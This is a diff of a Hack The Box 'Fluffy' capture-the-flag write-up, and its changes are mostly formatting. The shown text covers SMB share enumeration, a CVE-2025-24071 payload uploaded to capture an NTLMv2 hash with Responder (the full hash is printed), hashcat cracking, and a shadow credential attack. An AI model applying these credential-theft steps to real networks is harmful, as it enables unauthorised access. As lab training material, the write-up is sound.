@@ -2,7 +2,6 @@
 slug: /write-up/htb/machines/easy/fluffy
 pagination_next: null
 pagination_prev: null
-draft: true
 ---
 # Fluffy
 
@@ -38,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
 
 Looks like SMB ports are opened, let's check what in there:
 
-```
+```bash
 └─$ smbclient -L \\10.10.11.69 -N     
 
         Sharename       Type      Comment
@@ -76,17 +75,17 @@ Current directory is \\10.10.11.69\IT\
 
 Checking the changes from everything.exe shows something promising:
 
-```
+```txt
 Friday, 20 June 2025: Version 1.4.1.1028
-	fixed a crash when getting help text from a context menu item that throws an exception.
-	updated localization.
+ fixed a crash when getting help text from a context menu item that throws an exception.
+ updated localization.
 
 Friday, 23 May 2025: Version 1.4.1.1027
-	updated localization.
-	improved security against dll hijacking.
+ updated localization.
+ improved security against dll hijacking.
 
 Thursday, 1 August 2024: Version 1.4.1.1026
-	updated localization.
+ updated localization.
 ```
 
 Looks like version `1.4.1.1026` is vulnerable to dll hijacking.
@@ -105,7 +104,8 @@ smb: \> ls
                 5842943 blocks of size 4096. 2236145 blocks available
 smb: \>
 ```
-This looks like some Active Directory policies or something similar. According to https://blog.netwrix.com/2017/01/30/sysvol-directory/ 
+
+This looks like some Active Directory policies or something similar. According to [https://blog.netwrix.com/2017/01/30/sysvol-directory](https://blog.netwrix.com/2017/01/30/sysvol-directory/)
 
 > The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share.
 
@@ -115,11 +115,11 @@ The PDF warns the sysadm to patch the system to mitigate the impact of the follo
 
 CVE-2025-24996 - Critical
 
-Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use https://github.com/p0dalirius/Coercer to check if we're lucky.
+Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer) to check if we're lucky.
 
 CVE-2025-24071 - Critical
 
-Looks like there's a poc for CVE-2025-24071: https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-. The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.
+Looks like there's a poc for CVE-2025-24071: [https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-](https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-). The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.
 
 CVE-2025-46785 - High
 
@@ -141,8 +141,10 @@ Most likely one of these vulnerabilities will be useful to us
 
 The networks shares contain some zip files containing some exe files. Maybe there are useful somehow?
 
+```txt
 - everything-1.4.1.exe: https://www.voidtools.com/faq/
 - kepass-2.58.exe: https://keepass.info/news/n250709_2.59.html
+```
 
 We can enumerate all the users in the machine with `crackmapexec`:
 
@@ -166,16 +168,15 @@ This produces the list of computers, groups, users and permissions.
 
 ## CVE-2025-24071
 
-We managed to fabricate the payload required and upload it via SMB. 
+We managed to fabricate the payload required and upload it via SMB.
 
 ```bash
 python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep 
 ```
 
-
 When listening for events with responder, we get the NTLM Hash of user p.agila
 
-```
+```shell
 [+] Listening for events...                                                                                                                                                                                                                 
 
 [SMB] NTLMv2-SSP Client   : 10.10.11.69
@@ -183,7 +184,7 @@ When listening for events with responder, we get the NTLM Hash of user p.agila
 [SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:bd8f7fef990474ff:C7C0CB9CAC9525F2D208E32C10E7C248:0101000000000000001DAD238801DC01142342D76B81FA3800000000020008004E0058003800370001001E00570049004E002D0041005A00310051004E0056003200410030004400490004003400570049004E002D0041005A00310051004E005600320041003000440049002E004E005800380037002E004C004F00430041004C00030014004E005800380037002E004C004F00430041004C00050014004E005800380037002E004C004F00430041004C0007000800001DAD238801DC0106000400020000000800300030000000000000000100000000200000281213D3D4900283CBDD465132F4069EAD5996FF744C8BC81B4B59245480EF190A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310039000000000000000000
 ```
 
-With hashcat and rockyou, we are able to retrieve the password: 
+With hashcat and rockyou, we are able to retrieve the password:
 
 ```bash
 hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt
@@ -232,4 +233,3 @@ rdate -n [IP of Target]
 This will stop NTP and sync the date and time with the IP provided.
 
 After doing this, the shadow credential attack is successful and we retrieve the NT hash for `winrm_svc`
-
